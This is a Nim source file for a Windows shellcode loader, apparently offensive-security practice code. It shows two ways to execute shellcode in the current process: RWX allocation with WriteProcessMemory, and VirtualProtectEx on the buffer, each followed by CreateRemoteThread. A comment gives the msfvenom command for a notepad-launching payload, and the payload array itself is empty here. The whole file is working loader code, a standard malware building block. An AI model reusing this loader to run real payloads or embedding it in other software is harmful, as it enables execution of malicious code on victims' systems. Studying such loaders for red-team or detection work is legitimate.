# Description: Basic loader that executes shellcode in current process
# Author: Jakob Friedl
# Created On: 2023-11-11

import winim 
import strformat

# Status Codes 
template info(s: varargs[untyped]): untyped =
    echo "[*] ", s
template okay(s: varargs[untyped]): untyped = 
    echo "[+] ", s
template fail(s: varargs[untyped]): untyped = 
    echo "[-] ", s

proc injectVirtualAlloc[I, T](shellcode: var array[I, T]): int = 
    # Get Handle to current Process
    info "Getting handle to current process"
    var hProcess: HANDLE = GetCurrentProcess()
    if hProcess == 0: 
        fail "GetCurrentProcess failed"
        return ERROR
    okay fmt"Got handle to current process: {hProcess}"

    # VirtualAllocEx
    # LPVOID VirtualAllocEx(
    #     [in]           HANDLE hProcess,
    #     [in, optional] LPVOID lpAddress,
    #     [in]           SIZE_T dwSize,
    #     [in]           DWORD  flAllocationType,
    #     [in]           DWORD  flProtect
    # );
    info "Allocating memory in current process"
    var lpAddress: LPVOID = VirtualAllocEx(hProcess, nil, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    if lpAddress == nil: 
        fail "VirtualAllocEx failed"
        return ERROR
    okay fmt"VirtualAllocEx succeeded, lpAddress: {repr(lpAddress)}"

    # Write Shellcode to allocated memory
    info "Writing shellcode to allocated memory"
    var bytesWritten: SIZE_T = 0
    var success: BOOL = WriteProcessMemory(hProcess, lpAddress, shellcode.addr, shellcode.len, addr bytesWritten)
    if success == 0: 
        fail "WriteProcessMemory failed"
        return ERROR
    okay fmt"WriteProcessMemory succeeded, bytesWritten: {bytesWritten}"

    # Create Remote Thread
    info "Creating remote thread"
    var hThread: HANDLE = CreateRemoteThread(hProcess, nil, 0, cast[LPTHREAD_START_ROUTINE](lpAddress), nil, 0, nil)
    if hThread == 0: 
        fail "CreateRemoteThread failed"
        return ERROR
    okay fmt"CreateRemoteThread succeeded, hThread: {hThread}"

    # Wait for Thread to finish
    info "Waiting for thread to finish"
    discard WaitForSingleObject(hThread, -1)

    # Close Handles
    defer: CloseHandle(hThread)
    defer: CloseHandle(hProcess)

    return SUCCESS

proc injectVirtualProtect[I, T](shellcode: var array[I, T]): int =  
    # Get Handle to current Process 
    info "Getting handle to current process"
    var hProcess: HANDLE = GetCurrentProcess()
    if hProcess == 0: 
        fail "GetCurrentProcess failed"
        return ERROR
    okay fmt"Got handle to current process: {hProcess}"

    # VirtualProtectEx 
    # BOOL VirtualProtectEx(
    #     [in]  HANDLE hProcess,
    #     [in]  LPVOID lpAddress,
    #     [in]  SIZE_T dwSize,
    #     [in]  DWORD  flNewProtect,
    #     [out] PDWORD lpflOldProtect
    # );
    info "Changing memory protection"
    var oldProtect: DWORD = 0
    var success: BOOL = VirtualProtectEx(hProcess, shellcode.addr, shellcode.len, PAGE_EXECUTE_READWRITE, addr oldProtect)
    if success == 0: 
        fail "VirtualProtectEx failed"
        return ERROR
    okay fmt"VirtualProtectEx succeeded, oldProtect: {oldProtect}"

    # Create Remote Thread
    # HANDLE CreateRemoteThread(
    #     [in]  HANDLE                 hProcess,
    #     [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    #     [in]  SIZE_T                 dwStackSize,
    #     [in]  LPTHREAD_START_ROUTINE lpStartAddress,
    #     [in]  LPVOID                 lpParameter,
    #     [in]  DWORD                  dwCreationFlags,
    #     [out] LPDWORD                lpThreadId
    # );
    info "Creating remote thread"
    var hThread: HANDLE = CreateRemoteThread(hProcess, nil, 0, cast[LPTHREAD_START_ROUTINE](shellcode[0].addr), nil, 0, nil)
    if hThread == 0: 
        fail "CreateRemoteThread failed"
        return ERROR
    okay fmt"CreateRemoteThread succeeded, hThread: {hThread}"

    # Wait for Thread to finish
    info "Waiting for thread to finish"
    discard WaitForSingleObject(hThread, INFINITE)
    
    # Close Handles
    defer: CloseHandle(hThread)
    defer: CloseHandle(hProcess)
    
    return SUCCESS


when defined(windows): 
    # msfvenom -p windows/x64/exec cmd=notepad.exe --platform windows --arch x64 -f nim
    var shellcode: array[279, byte] = [
    byte ]

    when isMainModule: 
        # discard injectVirtualProtect(shellcode)
        discard injectVirtualAlloc(shellcode)
